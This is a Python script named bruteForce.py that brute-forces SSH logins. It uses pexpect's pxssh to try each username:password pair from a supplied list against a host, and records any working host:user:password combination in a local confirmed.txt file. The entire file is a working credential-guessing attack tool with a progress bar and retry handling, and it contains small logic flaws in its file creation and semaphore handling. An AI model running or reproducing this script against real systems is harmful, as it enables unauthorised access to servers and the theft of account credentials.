#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Name: bruteForce.py
Author: PiningNorwegianBlue
Date: August 5th, 2019
"""
from pexpect import pxssh
from threading import *
import os
from time import sleep
from tqdm import tqdm


con_lock = Semaphore(value=5)
confirmed_credentials = False


def login_ssh(host, cred):
    global confirmed_credentials
    con_lock.acquire()
    # Creating the progress bar
    pbar = tqdm(cred, ncols=75)
    for i in pbar:
        un = i.split(":")[0]
        pw = i.split(":")[1]
        pbar.set_description("{:<30}".format(i))
        try:
            s = pxssh.pxssh()
            if s.login(host, un, pw, sync_original_prompt=False):  # Attempting connection with username, password
                confirmed_credentials = True
                s.close()  # Closing connection
                # Appending credentials to confirmed.txt conditionally
                try:
                    path = "./confirmed.txt"
                    mode = "a+" if os.path.exists(path) else os.mknod(path)
                    with open(path, "r+") as r:
                        """
                        1. Opens or creates the hosts.txt file in read mode.
                        2. Checks the addresses (if any).
                        3. Changes the value of append to False if address is found.
                        4. Appends the address to hosts.txt if append is True.
                        """
                        append = True
                        for item in r.readlines():
                            if "{}:{}:{}".format(host, un, pw) in item:
                                append = False
                        if append:
                            with open("confirmed.txt", "a+") as w:
                                w.seek(0)
                                w.write("{}:{}:{}".format(host, un, pw))
                                w.write("\n")
                    pbar.set_description("CREDENTIALS FOUND - THREAD FINISHED")
                    return True
                except Exception as e:
                    print(e)
        except Exception as e:
            if "read_nonblocking" in str(e):
                sleep(0.5)
                login_ssh(host, cred)
            if "synchronize with original prompt" in str(e):
                sleep(0.1)
                login_ssh(host, cred)
        finally:
            if confirmed_credentials:
                con_lock.release()
